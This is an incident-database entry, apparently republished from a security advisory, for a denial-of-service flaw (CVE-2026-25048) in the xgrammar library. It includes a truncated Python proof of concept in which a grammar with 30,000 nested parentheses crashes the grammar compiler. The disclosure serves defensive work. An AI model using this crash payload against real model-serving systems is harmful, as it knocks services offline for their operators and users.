---
title: "INC-09265 — xgrammar vulnerable to DoS via multi-layer nesting"
layout: incident
permalink: /incident/INC-09265.html
incident_id: INC-09265
year: 2026
severity: High
description_preview: "### Summary The multi-level nested syntax caused a segmentation fault (core dump). ### Details A trigger stack overflow or memory exhaustion was caused by constructing a malicious grammar rule contain"
tags_str: "cve, ghsa, xgrammar"
---

{% raw %}
<div class="incident-anchor" id="inc-09265" markdown="1">

### INC-09265  [↗](/incident/INC-09265.html)

**xgrammar vulnerable to DoS via multi-layer nesting**  
_2026-03 · vulnerability-disclosure · Severity: High_

CVEs: `CVE-2026-25048`
CWEs: `CWE-674`

### Summary The multi-level nested syntax caused a segmentation fault (core dump). ### Details A trigger stack overflow or memory exhaustion was caused by constructing a malicious grammar rule containing 30,000 layers of nested parentheses. ### PoC ``` #!/usr/bin/env python3 """ XGrammar - Math Expression Generation Example """ import xgrammar as xgr import torch from transformers import AutoModelForCausalLM, AutoTokenizer, AutoConfig s = '(' * 30000 + 'a' grammar = f"root ::= {s}" def main(): device = "cuda" if torch.cuda.is_available() else "cpu" model_name = "Qwen/Qwen2.5-0.5B-Instruct" # Load model model = AutoModelForCausalLM.from_pretrained( model_name, torch_dtype=torch.float16 if device == "cuda" else torch.float32, device_map=device ) tokenizer = AutoTokenizer.from_pretrained(model_name) config = AutoConfig.from_pretrained(model_name) # Math expression grammar math_grammar = grammar # Setup tokenizer_info = xgr.TokenizerInfo.from_huggingface( tokenizer, vocab_size=config.vocab_size ) compiler = xgr.GrammarCompiler(tokenizer_info) compiled_grammar = compiler.compile_grammar(math_grammar) # Generate prompt = "Math: " inputs = tokenizer(prompt, return_tensors="pt").to(device) xgr_processor = xgr.contrib.hf.LogitsProcessor(compiled_grammar) output_ids = model.generate( **inputs, max_new_tokens=50,

**Affected:** pip/xgrammar  
**Attack vector:** `dos`  

**OWASP LLM Top 10:** `LLM03`  
**OWASP Agentic (ASI):** `ASI04`  
**NIST AI RMF:** `GOVERN-6.1`  
**MITRE ATLAS:** `AML.T0010`  

**References:**
- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-25048) _(advisory)_
- [GHSA-7rgv-gqhr-fxg3](https://github.com/advisories/GHSA-7rgv-gqhr-fxg3) _(advisory)_
- [https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-7rgv-gqhr-fxg3](https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-7rgv-gqhr-fxg3) _(reference)_
- [https://github.com/mlc-ai/xgrammar/releases/tag/v0.1.32](https://github.com/mlc-ai/xgrammar/releases/tag/v0.1.32) _(reference)_

**Tags:** `cve`, `ghsa`, `xgrammar`

</div>

{% endraw %}
